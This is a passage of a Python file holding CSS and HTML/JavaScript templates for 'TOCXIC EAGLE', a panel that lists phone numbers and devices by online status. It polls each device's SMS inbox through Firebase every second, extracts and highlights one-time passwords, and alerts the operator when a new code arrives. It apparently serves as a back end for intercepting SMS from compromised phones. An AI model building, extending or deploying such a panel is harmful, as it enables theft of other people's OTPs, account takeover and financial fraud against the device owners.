.inbox-top{display:flex;align-items:center;gap:14px;margin-bottom:14px}
.back-btn{background:rgba(16,24,40,.06);border:none;width:42px;height:42px;border-radius:12px;
font-size:18px;cursor:pointer;color:#344054;font-weight:700;text-decoration:none;
display:inline-flex;align-items:center;justify-content:center;flex-shrink:0}
.inbox-num{font-size:17px;font-weight:800;color:var(--text);font-family:'Orbitron',sans-serif}
.inbox-num.unknown{color:var(--muted2);font-style:italic}
.inbox-status{display:flex;align-items:center;gap:6px;font-size:12px;color:#05603a;
font-weight:800;margin-top:4px}
.inbox-status .dot{width:8px;height:8px;border-radius:50%;background:#12b76a}
.inbox-status.offline{color:#b42318}
.inbox-status.offline .dot{background:#E40000}
.inbox-meta{font-size:11px;color:var(--muted);display:flex;justify-content:space-between;
align-items:center;padding-top:12px;border-top:1px solid var(--sep)}
.refresh-icon{cursor:pointer;font-size:20px;color:var(--muted2);padding:6px;
min-width:36px;min-height:36px;display:flex;align-items:center;justify-content:center}
.top-number-badge{background:linear-gradient(135deg,#fef3c7,#fde68a);border:2px solid #fbbf24;
border-radius:14px;padding:12px 14px;margin-bottom:12px;display:flex;align-items:center;
gap:10px;font-size:13px;font-weight:700;color:#92400e}
.top-number-badge .tn-icon{font-size:22px;flex-shrink:0}
.top-number-badge .tn-info{flex:1;min-width:0}
.top-number-badge .tn-num{font-size:16px;font-weight:800;color:#78350f;word-break:break-all;
font-family:'Orbitron',sans-serif}
.top-number-badge .tn-count{font-size:11px;color:#92400e;font-weight:600;margin-top:2px;opacity:.85}
.top-number-badge .tn-highlight{background:#fbbf24;color:#78350f;padding:2px 8px;
border-radius:8px;font-weight:800;font-size:11px}
.sms-list{background:var(--card);border-radius:18px;overflow:hidden;border:1px solid var(--sep)}
.sms-item{padding:18px 20px;border-bottom:1px solid var(--sep);position:relative}
.sms-item:last-child{border-bottom:none}
.sms-item.fresh{background:linear-gradient(90deg,rgba(18,183,106,.08),transparent 45%)}
.sms-item.otp-item{background:linear-gradient(90deg,rgba(15,60,201,.06),transparent 45%)}
.sms-item .msg-type-badge{position:absolute;top:12px;right:12px;font-size:9px;
font-weight:800;padding:3px 7px;border-radius:6px;font-family:'Orbitron',sans-serif}
.sms-item .msg-type-badge.otp{background:#0f3cc9;color:#fff}
.sms-item .msg-type-badge.number{background:#12b76a;color:#fff}
.sms-head{display:flex;justify-content:space-between;align-items:flex-start;
margin-bottom:10px;gap:10px;flex-wrap:wrap;padding-right:44px}
.sender{font-size:12px;font-weight:800;color:#E40000;font-family:'Orbitron',sans-serif;
display:flex;align-items:center;flex-wrap:wrap}
.new-badge{background:var(--grad-r);color:#fff;font-size:9px;font-weight:800;
padding:2px 6px;border-radius:10px;margin-left:6px}
.sms-time{font-size:11px;color:var(--muted);font-weight:600;white-space:nowrap}
.sms-time.fresh{color:#05603a;font-weight:800}
.time-ago{font-size:10px;color:var(--muted2);font-weight:700;margin-top:2px;text-align:right}
.time-ago.fresh{color:#05603a}
.sms-body{font-size:14px;color:#344054;line-height:1.55;word-break:break-word;white-space:pre-wrap}
.sms-body .phone-highlight{background:#fef3c7;color:#92400e;padding:1px 5px;
border-radius:4px;font-weight:800;border:1px dashed #fbbf24}
.otp-highlight{background:linear-gradient(135deg,#d1fae5,#a7f3d0);color:#065f46;
padding:3px 8px;border-radius:6px;font-weight:800;border:1px dashed #12b76a;
font-family:'Orbitron',sans-serif;letter-spacing:1px}
.otp-copy-btn{display:inline-flex;align-items:center;gap:6px;margin-top:12px;
padding:9px 16px;background:linear-gradient(135deg,#12b76a,#32d583);color:#fff;
border:none;border-radius:20px;font-weight:800;font-size:12px;font-family:inherit;
min-height:40px}
.empty{text-align:center;padding:60px 20px;color:var(--muted);font-size:14px;
background:var(--card);border-radius:18px;border:1px solid var(--sep)}
.loading-text{text-align:center;padding:26px;color:var(--muted);font-size:13px;
background:var(--card);border-radius:18px;margin-bottom:16px;border:1px solid var(--sep)}
.spinner{display:inline-block;width:16px;height:16px;border:2px solid rgba(16,24,40,.15);
border-top-color:#E40000;border-radius:50%;animation:spin .8s linear infinite;
vertical-align:middle;margin-right:8px}
@keyframes spin{to{transform:rotate(360deg)}}
.progress-bar{width:100%;height:4px;background:rgba(16,24,40,.08);border-radius:2px;
overflow:hidden;margin-top:12px}
.progress-fill{height:100%;background:var(--grad);border-radius:2px;transition:width .3s}
.live-badge{display:inline-flex;align-items:center;gap:4px;background:rgba(18,183,106,.15);
color:#05603a;font-size:10px;font-weight:800;padding:3px 9px;border-radius:20px;
margin-left:8px;font-family:'Orbitron',sans-serif}
.live-badge .dot{width:6px;height:6px;border-radius:50%;background:#12b76a;
animation:pulse 1.2s infinite}
.filter-bar{display:flex;gap:8px;margin-top:14px;flex-wrap:wrap}
.filter-btn{padding:9px 14px;font-size:12px;font-weight:800;border-radius:12px;
border:1px solid rgba(16,24,40,.15);background:var(--card);color:var(--muted);
font-family:inherit;min-height:42px}
.filter-btn.active{background:var(--grad);color:#fff;border-color:transparent}
.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(140px);
background:rgba(16,24,40,.94);color:#fff;padding:14px 26px;border-radius:16px;
font-weight:700;font-size:13px;z-index:9999;transition:transform .35s;
pointer-events:none;max-width:90vw;text-align:center}
.toast.show{transform:translateX(-50%) translateY(0)}
.hidden{display:none !important}
@media(min-width:640px){.stats{grid-template-columns:repeat(4,1fr)}}
"""

# ============================================================
# ADMIN LOGIN PAGE
# ============================================================
ADMIN_LOGIN_HTML = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>TOCXIC EAGLE — Admin</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<meta name="theme-color" content="#0F3CC9">
""" + ORBITRON + """
<style>""" + MOBILE_CSS + """
body{min-height:100vh;display:flex;align-items:center;justify-content:center;
background:linear-gradient(135deg,#0F3CC9,#1e293b);color:#e2e8f0;padding:20px}
.box{width:100%;max-width:400px;background:#0f172a;border:1px solid #334155;
border-radius:22px;padding:34px 26px;box-shadow:0 20px 60px rgba(0,0,0,.5)}
.lock{text-align:center;font-size:52px;margin-bottom:14px}
h1{text-align:center;font-family:'Orbitron',sans-serif;font-size:20px;margin-bottom:6px;
background:linear-gradient(135deg,#E40000,#f59e0b);-webkit-background-clip:text;
background-clip:text;color:transparent;letter-spacing:2px;font-weight:900}
p.sub{text-align:center;font-size:12px;color:#94a3b8;margin-bottom:24px;
font-family:'Orbitron',sans-serif;letter-spacing:2px;text-transform:uppercase}
.pwd-wrap{position:relative}
input{width:100%;padding:16px 48px 16px 16px;border-radius:12px;
border:1.5px solid #334155;background:#020617;color:#e2e8f0;outline:none;transition:.2s}
input:focus{border-color:#f59e0b;box-shadow:0 0 0 4px rgba(245,158,11,.15)}
.toggle-pwd{position:absolute;right:14px;top:50%;transform:translateY(-50%);
cursor:pointer;font-size:20px;color:#94a3b8;padding:4px}
button{width:100%;margin-top:16px;padding:16px;border:none;border-radius:12px;
background:linear-gradient(135deg,#E40000,#f59e0b);color:#fff;font-weight:800;
font-size:14px;font-family:'Orbitron',sans-serif;letter-spacing:1px;
cursor:pointer;min-height:54px;text-transform:uppercase}
button:active{transform:scale(.98)}
.err{margin-top:14px;text-align:center;color:#f04438;font-size:13px;font-weight:700}
.back-link{display:block;text-align:center;margin-top:16px;color:#94a3b8;
text-decoration:none;font-size:12px}
</style></head><body>
<form class="box" method="POST"><div class="lock">👑</div>
<h1>SUPER MASTER</h1><p class="sub">Admin access</p>
<div class="pwd-wrap">
<input type="password" id="pwd" name="password" placeholder="Admin Password" required autofocus>
<span class="toggle-pwd" onclick="togglePwd(event)">👁️</span>
</div>
<button type="submit">Admin Login</button>__ERROR__
<a href="/" class="back-link">← Back to landing</a>
</form>
<script>
function togglePwd(e){
  var i=document.getElementById('pwd'); var t=e.target;
  if(i.type==='password'){i.type='text';t.textContent='🙈';}
  else{i.type='password';t.textContent='👁️';}
}
</script>
</body></html>"""


# ============================================================
# LANDING PAGE
# ============================================================
LANDING_HTML = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>TOCXIC EAGLE</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<meta name="theme-color" content="#E40000">
""" + ORBITRON + """
<style>""" + MOBILE_CSS + """
body{min-height:100vh;display:flex;align-items:center;justify-content:center;
background:radial-gradient(ellipse at top,#ffe4e4 0%,#f5f6fa 40%,#eef2ff 100%);
color:#101828;padding:30px 20px;text-align:center}
.wrap{max-width:560px;width:100%}
.eagle{font-size:96px;margin-bottom:14px;filter:drop-shadow(0 12px 32px rgba(228,0,0,.35));
animation:float 3s ease-in-out infinite}
@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
h1{font-family:'Orbitron',sans-serif;font-weight:900;font-size:36px;letter-spacing:3px;
margin-bottom:10px;background:linear-gradient(135deg,#E40000 0%,#0F3CC9 100%);
-webkit-background-clip:text;background-clip:text;color:transparent}
.subtitle{font-family:'Orbitron',sans-serif;font-weight:600;font-size:11px;color:#98a2b3;
letter-spacing:4px;margin-bottom:36px;text-transform:uppercase}
.tagline{font-size:15px;color:#475467;line-height:1.7;margin-bottom:40px}
.cta-grid{display:grid;grid-template-columns:1fr;gap:14px;max-width:400px;margin:0 auto 40px}
@media(min-width:520px){.cta-grid{grid-template-columns:1fr 1fr}}
.cta{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px;
padding:28px 20px;border-radius:22px;text-decoration:none;color:#fff;font-weight:800;
transition:.25s;min-height:140px}
.cta.user{background:linear-gradient(135deg,#E40000 0%,#FF4D4D 100%);
box-shadow:0 12px 32px rgba(228,0,0,.35)}
.cta.otp{background:linear-gradient(135deg,#0F3CC9 0%,#3B82F6 100%);
box-shadow:0 12px 32px rgba(15,60,201,.35)}
.cta:active{transform:scale(.97)}
.cta .icon{font-size:42px}
.cta .label{font-family:'Orbitron',sans-serif;font-size:14px;letter-spacing:1.5px;text-transform:uppercase}
.cta .desc{font-size:11px;opacity:.85;font-weight:600}
.features{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;max-width:520px;margin:0 auto}
.feat{background:rgba(255,255,255,.7);border:1px solid rgba(255,255,255,.9);
border-radius:16px;padding:16px 10px;text-align:center}
.feat .fi{font-size:24px;margin-bottom:6px}
.feat .fl{font-size:10px;font-weight:800;color:#344054;font-family:'Orbitron',sans-serif;
letter-spacing:.8px;text-transform:uppercase}
.footer{margin-top:44px;font-size:10px;color:#98a2b3;font-family:'Orbitron',sans-serif;
letter-spacing:3px;text-transform:uppercase}
.admin-link{display:inline-block;margin-top:16px;font-size:11px;color:#667085;
text-decoration:none;font-family:'Orbitron',sans-serif;letter-spacing:1px;
padding:8px 14px;border-radius:10px;background:rgba(16,24,40,.05)}
</style></head><body>
<div class="wrap">
<div class="eagle">🦅</div>
<h1>TOCXIC EAGLE</h1>
<div class="subtitle">OTP PANEL</div>
<p class="tagline">Real-time SMS & OTP monitoring panel.<br>Lightning fast · Secure · Always live.</p>
<div class="cta-grid">
<a href="/user" class="cta user">
<span class="icon">📱</span>
<span class="label">Open Panel</span>
<span class="desc">No login required</span>
</a>
<a href="/otp" class="cta otp">
<span class="icon">🔐</span>
<span class="label">Personal OTP</span>
<span class="desc">Add your firebase</span>
</a>
</div>
<div class="features">
<div class="feat"><div class="fi">⚡</div><div class="fl">Realtime</div></div>
<div class="feat"><div class="fi">🛡️</div><div class="fl">Secure</div></div>
<div class="feat"><div class="fi">🔄</div><div class="fl">Auto 10m</div></div>
</div>
<a href="/admin" class="admin-link">👑 Admin Login</a>
<div class="footer">TOCXIC EAGLE · v70</div>
</div>
</body></html>"""


# ============================================================
# USER DASHBOARD (NO LOGIN)
# ============================================================
USER_DASHBOARD_HTML = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>TOCXIC EAGLE — Panel</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<meta name="theme-color" content="#E40000">
""" + ORBITRON + """
<style>""" + MOBILE_CSS + BRAND_CSS + """</style></head><body>

<div class="topbar">
<div class="brand"><span class="eagle">🦅</span>
<div><span class="name">TOCXIC EAGLE</span><span class="sub">USER PANEL</span></div></div>
<div class="nav">
<a href="/user" class="nav-link active">📱 Numbers</a>
<a href="/otp" class="nav-link otp">🔐 Personal OTP</a>
</div>
<div style="display:flex;align-items:center;gap:10px">
<button onclick="manualRefresh()" style="background:var(--grad);color:#fff;border:none;
width:42px;height:42px;border-radius:50%;font-size:18px">🔄</button>
<div class="conn loading" id="conn-badge"><span class="dot"></span><span id="conn-text">...</span></div>
<a href="/" class="nav-link">🏠</a>
</div>
</div>

<div class="container">
<div id="list-view">
<div class="stats">
<div class="stat total"><div class="label">Total</div><div class="value" id="s-total">0</div></div>
<div class="stat online"><div class="label">Online</div><div class="value" id="s-online">0</div></div>
<div class="stat offline"><div class="label">Offline</div><div class="value" id="s-offline">0</div></div>
<div class="stat otp"><div class="label">OTP Rate</div><div class="value" id="s-otp">0%</div></div>
</div>
<div class="quick">
<div class="info">📱 Numbers <b id="q-dev">0</b></div>
<div class="btns"><button class="green" onclick="manualRefresh()">🔄 Refresh</button></div>
</div>
<div class="num-filter-bar">
<button class="num-filter-btn active" id="nf-all" onclick="setNumberFilter('all')">All <span class="cnt" id="nf-all-c">0</span></button>
<button class="num-filter-btn" id="nf-online" onclick="setNumberFilter('online')">🟢 Online <span class="cnt" id="nf-online-c">0</span></button>
<button class="num-filter-btn" id="nf-offline" onclick="setNumberFilter('offline')">🔴 Offline <span class="cnt" id="nf-offline-c">0</span></button>
</div>
<div id="loading-text" class="loading-text">
<span class="spinner"></span><span id="loading-msg">Loading...</span>
<div class="progress-bar"><div class="progress-fill" id="prog-fill" style="width:0%"></div></div>
</div>
<div id="list-content" class="hidden">
<div class="search-box"><input id="search-num" placeholder="🔎 Search number / device" oninput="renderNumbers()"></div>
<div class="list-header">
<h2>📱 Numbers <span class="live-badge" id="live-badge" style="display:none"><span class="dot"></span>LIVE</span></h2>
<span class="count" id="num-count">0</span>
</div>
<div id="num-list"></div>
</div>
</div>

<div id="inbox-view" class="hidden">
<div class="inbox-header">
<div class="inbox-top">
<a href="#" class="back-btn" onclick="event.preventDefault();backToList()">←</a>
<div style="flex:1">
<div class="inbox-num" id="inbox-num">+91 ------</div>
<div class="inbox-status" id="inbox-status"><span class="dot"></span><span id="inbox-status-text">Online</span></div>
</div>
</div>
<div class="inbox-meta">
<span>⚡ LIVE · auto 1s · Latest 60 SMS</span>
<span class="refresh-icon" onclick="loadInbox(true)">🔄</span>
</div>
<div class="filter-bar">
<button class="filter-btn" id="fb-10m" onclick="setFilter('10m')">⚡ 10 min</button>
<button class="filter-btn active" id="fb-recent" onclick="setFilter('recent')">🔥 24h</button>
<button class="filter-btn" id="fb-all" onclick="setFilter('all')">📜 All</button>
</div>
</div>
<div id="top-number-badge" class="top-number-badge hidden">
<div class="tn-icon">🏆</div>
<div class="tn-info">
<div class="tn-num" id="tn-num">-</div>
<div class="tn-count">Sabse zyada baar <span class="tn-highlight" id="tn-count-badge">0</span></div>
</div>
</div>
<div id="sms-container"></div>
</div>
</div>

<div id="toast" class="toast"></div>

<script>
let allNumbers = [], numbers = [], currentNum = null;
let refreshTimer = null, lastSig = '', lastInboxSig = '', allInboxMsgs = [];
let currentFilter = 'recent', currentNumberFilter = 'all';
let lastOtpSeen = '', notifAsked = false;

function toast(t){ const e = document.getElementById('toast'); e.textContent = t;
e.classList.add('show'); setTimeout(()=>e.classList.remove('show'), 2500); }

function playSound(){ try{
const ctx = new (window.AudioContext||window.webkitAudioContext)();
[880,1100,880].forEach((f,i)=>{ const o = ctx.createOscillator(), g = ctx.createGain();
o.connect(g); g.connect(ctx.destination); o.frequency.value = f;
const t = ctx.currentTime + i*0.2; g.gain.setValueAtTime(0.2,t);
g.gain.exponentialRampToValueAtTime(0.001,t+0.18); o.start(t); o.stop(t+0.18); }); }catch(e){} }

function askNotif(){ if(notifAsked) return; notifAsked = true;
if('Notification' in window && Notification.permission === 'default') Notification.requestPermission(); }

function showOtpNotif(otp, from, msg){
toast('🔔 OTP: ' + otp + ' — ' + from); playSound();
if('Notification' in window && Notification.permission === 'granted'){
try{ const n = new Notification('🔔 OTP: ' + otp, { body: from + '\\n' + msg.slice(0,100), tag:'otp-'+otp });
setTimeout(()=>n.close(), 10000); }catch(e){} }
if(navigator.vibrate){ try{ navigator.vibrate([200,100,200,100,200]); }catch(e){} } }

async function manualRefresh(){ toast('🔄 Refreshing...');
try{ const r = await fetch('/api/refresh',{method:'POST'}); const d = await r.json();
if(d.success){ setTimeout(loadNumbers, 800); toast('✅ Triggered'); }
else toast('❌ ' + (d.error||'Failed')); } catch(e){ toast('❌ Network error'); } }

function setNumberFilter(f){ currentNumberFilter = f;
document.getElementById('nf-all').classList.toggle('active', f==='all');
document.getElementById('nf-online').classList.toggle('active', f==='online');
document.getElementById('nf-offline').classList.toggle('active', f==='offline');
applyFilter(); renderNumbers(); }

function setFilter(f){ currentFilter = f;
document.getElementById('fb-10m').classList.toggle('active', f==='10m');
document.getElementById('fb-recent').classList.toggle('active', f==='recent');
document.getElementById('fb-all').classList.toggle('active', f==='all');
renderMessages(); }

function applyFilter(){
if(currentNumberFilter === 'online') numbers = allNumbers.filter(n => n.online === true);
else if(currentNumberFilter === 'offline') numbers = allNumbers.filter(n => n.online !== true);
else numbers = allNumbers.slice();
document.getElementById('num-count').textContent = numbers.length; }

async function checkConn(){
try{ const r = await fetch('/api/conn'); const d = await r.json();
const b = document.getElementById('conn-badge'), t = document.getElementById('conn-text');
if(d.mongo_connected){ b.className = 'conn online'; t.textContent = 'Live'; }
else { b.className = 'conn offline'; t.textContent = 'Off'; } }catch(e){} }

async function loadNumbers(){
try{ const r = await fetch('/api/numbers'); const d = await r.json();
if(!d.success){ document.getElementById('loading-msg').textContent = '❌ ' + (d.error||'Error'); return; }
allNumbers = d.numbers || [];
document.getElementById('s-total').textContent = d.total;
document.getElementById('s-online').textContent = d.online;
document.getElementById('s-offline').textContent = d.offline;
document.getElementById('s-otp').textContent = d.otp_rate + '%';
document.getElementById('q-dev').textContent = allNumbers.length;
document.getElementById('nf-all-c').textContent = allNumbers.length;
document.getElementById('nf-online-c').textContent = d.online || 0;
document.getElementById('nf-offline-c').textContent = d.offline || 0;
if(d.progress){ const pct = d.progress.total > 0 ? Math.floor(d.progress.done/d.progress.total*100) : 0;
document.getElementById('prog-fill').style.width = pct + '%';
document.getElementById('loading-msg').textContent = 'Fetching ' + d.progress.done + '/' + d.progress.total + ' (' + pct + '%)...'; }
applyFilter();
if(allNumbers.length > 0){
document.getElementById('loading-text').classList.add('hidden');
document.getElementById('list-content').classList.remove('hidden');
const sig = allNumbers.length + '|' + d.online + '|' + currentNumberFilter;
if(sig !== lastSig){ lastSig = sig; renderNumbers(); } }
else { document.getElementById('loading-text').classList.remove('hidden');
document.getElementById('loading-msg').textContent = d.loading ? '⏳ Loading...' : '📭 No numbers'; }
}catch(e){ document.getElementById('loading-msg').textContent = '❌ Network error'; } }

function renderNumbers(){
const q = (document.getElementById('search-num').value || '').toLowerCase();
const box = document.getElementById('num-list');
const filtered = numbers.filter(n => !q || (n.number||'').toLowerCase().includes(q) ||
(n.device_name||'').toLowerCase().includes(q) || (n.fb_name||'').toLowerCase().includes(q));
if(filtered.length === 0){ box.innerHTML = '<div class="empty">📭 No numbers found</div>'; return; }
box.innerHTML = filtered.map(n => {
const isOn = n.online === true;
const isUnk = (n.number||'').startsWith('UNKNOWN-');
const iconCls = isUnk ? 'gray' : (isOn ? '' : 'red');
const badgeCls = isOn ? 'badge-online' : 'badge-offline';
const badgeTxt = isOn ? 'Online' : 'Offline';
const cardCls = isOn ? '' : 'offline';
const titleCls = isUnk ? 'unknown' : '';
const conf = n.confidence || 0;
let confB = '';
if(!isUnk && conf > 0) confB = '<span class="confidence-badge">✓ ' + conf + 'x</span>';
const idx = numbers.indexOf(n);
return '<div class="num-card ' + cardCls + '">' +
'<div class="num-icon ' + iconCls + '" onclick="openInboxAt(' + idx + ')">' + (isUnk ? '❓' : '📶') + '</div>' +
'<div class="num-info" onclick="openInboxAt(' + idx + ')">' +
'<div class="num-title ' + titleCls + '">' + escapeHtml(n.number) + ' ' + confB + '</div>' +
'<div class="num-sub"><span class="pill">📨 ' + n.msg_count + ' SMS</span>' +
(n.otp_count > 0 ? '<span class="pill otp">🔑 ' + n.otp_count + ' OTP</span>' : '') + '</div></div>' +
'<div class="' + badgeCls + '" onclick="openInboxAt(' + idx + ')"><span class="dot"></span>' + badgeTxt + '</div>' +
'<div class="arrow">›</div></div>'; }).join(''); }

function openInboxAt(idx){ if(idx < 0 || idx >= numbers.length) return; openInbox(numbers[idx]); }

async function openInbox(n){
currentNum = n; lastInboxSig = ''; allInboxMsgs = []; currentFilter = 'recent'; lastOtpSeen = '';
askNotif();
document.getElementById('fb-10m').classList.remove('active');
document.getElementById('fb-recent').classList.add('active');
document.getElementById('fb-all').classList.remove('active');
document.getElementById('list-view').classList.add('hidden');
document.getElementById('inbox-view').classList.remove('hidden');
document.getElementById('inbox-num').textContent = n.number;
const statusEl = document.getElementById('inbox-status');
const statusTxt = document.getElementById('inbox-status-text');
if(n.online === true){ statusEl.className = 'inbox-status'; statusTxt.textContent = 'Online'; }
else { statusEl.className = 'inbox-status offline'; statusTxt.textContent = 'Offline'; }
document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> Loading...</div>';
await loadInbox(false);
if(refreshTimer) clearInterval(refreshTimer);
refreshTimer = setInterval(()=>loadInbox(false), 1000); }

function findTop(msgs){ const counter = {}, senders = new Set();
msgs.forEach(m => { for(const n of (m.from||'').match(/(?<!\\d)([6-9]\\d{9})(?!\\d)/g) || []) senders.add(n); });
msgs.forEach(m => { for(const n of (m.message||'').match(/(?<!\\d)([6-9]\\d{9})(?!\\d)/g) || []){
if(senders.has(n)) continue; if(n.startsWith('1800')||n.startsWith('1900')||n.startsWith('1991')) continue;
counter[n] = (counter[n]||0) + 1; } });
let top = null, cnt = 0;
for(const [n, c] of Object.entries(counter)) if(c > cnt){ top = n; cnt = c; }
return top ? {number: top, count: cnt} : null; }

function updateTopBadge(msgs){
const b = document.getElementById('top-number-badge');
const t = findTop(msgs);
if(t && t.count >= 2){
document.getElementById('tn-num').textContent = '📞 ' + t.number;
document.getElementById('tn-count-badge').textContent = t.count + ' bar';
b.classList.remove('hidden'); } else b.classList.add('hidden'); }

async function loadInbox(showLoader){
if(!currentNum) return;
if(showLoader) document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> Refreshing...</div>';
const c = new AbortController(); const tid = setTimeout(()=>c.abort(), 15000);
try{ const r = await fetch('/api/inbox?fb=' + encodeURIComponent(currentNum.firebase) +
'&id=' + encodeURIComponent(currentNum.device_id) + '&num=' + encodeURIComponent(currentNum.number),
{ signal: c.signal }); clearTimeout(tid);
const d = await r.json();
if(!d.success){ document.getElementById('sms-container').innerHTML = '<div class="empty">❌ ' + (d.error||'Error') + '</div>'; return; }
const msgs = d.messages || []; allInboxMsgs = msgs;
if(msgs.length > 0){ const newest = msgs[0];
const otp = newest.otp || extractOtp(newest.message);
const sig = (newest.timestamp||0) + '|' + otp + '|' + (newest.message||'').slice(0,40);
if(otp && sig !== lastOtpSeen){ lastOtpSeen = sig; showOtpNotif(otp, newest.from||'Unknown', newest.message||''); } }
const sig = msgs.map(m => (m.timestamp||0) + '|' + (m.message||'').slice(0,40)).join('#');
if(sig !== lastInboxSig){ lastInboxSig = sig; renderMessages(); }
}catch(e){ clearTimeout(tid); } }

function timeAgo(ts, now){
if(!ts) return ''; const d = now - ts;
if(d < 10) return 'अभी'; if(d < 60) return d + 's';
if(d < 3600) return Math.floor(d/60) + 'm'; if(d < 86400) return Math.floor(d/3600) + 'h';
return Math.floor(d/86400) + 'd'; }

function highlightPhones(t){ return t.replace(/(?<!\\d)([6-9]\\d{9})(?!\\d)/g, '<span class="phone-highlight">$1</span>'); }

function renderMessages(){
const box = document.getElementById('sms-container');
const now = Math.floor(Date.now()/1000);
let msgs = allInboxMsgs;
if(currentFilter === '10m') msgs = msgs.filter(m => (m.timestamp||0) >= now - 600);
else if(currentFilter === 'recent') msgs = msgs.filter(m => (m.timestamp||0) >= now - 86400);
msgs = [...msgs].sort((a,b) => (b.timestamp||0) - (a.timestamp||0)).slice(0, 60);
updateTopBadge(msgs);
if(!msgs.length){ box.innerHTML = '<div class="empty">📭 No SMS</div>'; return; }
box.innerHTML = '<div class="sms-list">' + msgs.map(m => {
const otp = m.otp || extractOtp(m.message);
let body = otp ? escapeHtml(m.message).replace(otp, '<span class="otp-highlight">' + otp + '</span>') : escapeHtml(m.message);
body = highlightPhones(body);
const copyBtn = otp ? '<button class="otp-copy-btn" onclick="copyOtp(\\'' + otp + '\\')">📋 Copy OTP ' + otp + '</button>' : '';
const ts = m.timestamp || 0; const isFresh = ts >= now - 120;
const cls = isFresh ? 'fresh' : (otp ? 'otp-item' : '');
const timeStr = m.date_string || fmtTime(ts);
const newB = isFresh ? '<span class="new-badge">NEW</span>' : '';
let typeB = '';
if(otp) typeB = '<span class="msg-type-badge otp">OTP</span>';
else if(/[6-9]\\d{9}/.test(m.message||'')) typeB = '<span class="msg-type-badge number">📞 NUM</span>';
return '<div class="sms-item ' + cls + '">' + typeB +
'<div class="sms-head"><div class="sender">' + escapeHtml(m.from||'Unknown') + ' ' + newB + '</div>' +
'<div style="text-align:right"><div class="sms-time ' + (isFresh?'fresh':'') + '">' + escapeHtml(timeStr) + '</div>' +
'<div class="time-ago ' + (isFresh?'fresh':'') + '">' + timeAgo(ts, now) + '</div></div></div>' +
'<div class="sms-body">' + body + '</div>' + copyBtn + '</div>'; }).join('') + '</div>'; }

function backToList(){
document.getElementById('inbox-view').classList.add('hidden');
document.getElementById('list-view').classList.remove('hidden');
if(refreshTimer){ clearInterval(refreshTimer); refreshTimer = null; }
currentNum = null; }

function extractOtp(text){ if(!text) return '';
const t = String(text);
let m = t.match(/(?:otp|one[- ]time|password|code|pin|verification|passcode)[^\\d]{0,30}(\\d{4,8})/i);
if(m) return m[1];
m = t.match(/(\\d{4,8})[^\\d]{0,30}(?:is your|otp|one[- ]time|code)/i);
if(m) return m[1]; m = t.match(/#(\\d{4,8})/); if(m) return m[1]; return ''; }

function fmtTime(ts){ if(!ts) return '';
try{ let t = parseInt(ts); if(t > 1e12) t = Math.floor(t/1000); if(t < 1e9) return String(ts);
const d = new Date(t*1000);
const opts = { timeZone:'Asia/Kolkata', hour12:true, day:'2-digit', month:'2-digit', year:'numeric', hour:'2-digit', minute:'2-digit' };
return d.toLocaleString('en-IN', opts).replace(',', ' |'); }catch(e){ return String(ts); } }

function copyOtp(c){ const done = ()=>toast('✅ Copied: ' + c);
if(navigator.clipboard) navigator.clipboard.writeText(c).then(done).catch(()=>{
const ta = document.createElement('textarea'); ta.value = c; document.body.appendChild(ta);
ta.select(); document.execCommand('copy'); ta.remove(); done(); }); }

function escapeHtml(s){ return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }

checkConn(); loadNumbers();
setInterval(checkConn, 8000);
setInterval(()=>{ if(!currentNum) loadNumbers(); }, 5000);
</script>
</body></html>"""


# ============================================================
# PERSONAL OTP (public)
# ============================================================
PERSONAL_OTP_HTML = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>TOCXIC EAGLE — Personal OTP</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<meta name="theme-color" content="#0F3CC9">
""" + ORBITRON + """
<style>""" + MOBILE_CSS + BRAND_CSS + """
.fb-add-card{background:linear-gradient(135deg,#ecfdf5,#d1fae5);border:2px solid #6ee7b7;
border-radius:18px;padding:18px;margin-bottom:14px}
.fb-add-card h3{font-size:13px;font-weight:800;color:#065f46;margin-bottom:10px;
display:flex;align-items:center;gap:8px;font-family:'Orbitron',sans-serif;letter-spacing:1px;
text-transform:uppercase}
.fb-add-row{display:flex;gap:8px;flex-wrap:wrap}
.fb-add-row input{flex:1;min-width:180px;padding:14px 12px;border-radius:10px;
border:1.5px solid #6ee7b7;background:#fff;outline:none;color:#101828;font-family:monospace}
.fb-add-row input:focus{border-color:#12b76a;box-shadow:0 0 0 4px rgba(18,183,106,.15)}
.fb-add-row button{padding:14px 18px;border:none;border-radius:12px;font-weight:800;
font-size:13px;min-height:50px}
.fb-add-row button.primary{background:linear-gradient(135deg,#12b76a,#32d583);color:#fff}
.fb-add-row button.gray{background:rgba(16,24,40,.08);color:#344054}
.bulk-area{margin-top:10px;display:none}
.bulk-area textarea{width:100%;padding:14px;border-radius:10px;border:1.5px solid #6ee7b7;
background:#fff;font-size:13px;min-height:120px;font-family:monospace;outline:none;
color:#101828;resize:vertical}
.bulk-area button{margin-top:8px;padding:12px 18px;border:none;border-radius:10px;
font-weight:800;font-size:13px;background:linear-gradient(135deg,#12b76a,#32d583);
color:#fff;min-height:48px}
.fb-msg{margin-top:10px;padding:12px 14px;border-radius:10px;font-size:13px;display:none;font-weight:700}
.fb-msg.ok{background:rgba(18,183,106,.15);color:#05603a;display:block}
.fb-msg.err{background:rgba(240,68,56,.12);color:#b42318;display:block}
.my-fb-list{display:grid;gap:8px;margin-top:10px}
.my-fb-card{background:#fff;border:1.5px solid var(--sep);border-radius:12px;padding:12px;
display:flex;align-items:center;gap:10px}
.my-fb-card .fb-icon{width:38px;height:38px;border-radius:9px;
background:linear-gradient(135deg,#d1fae5,#a7f3d0);display:flex;align-items:center;
justify-content:center;font-size:18px;flex-shrink:0}
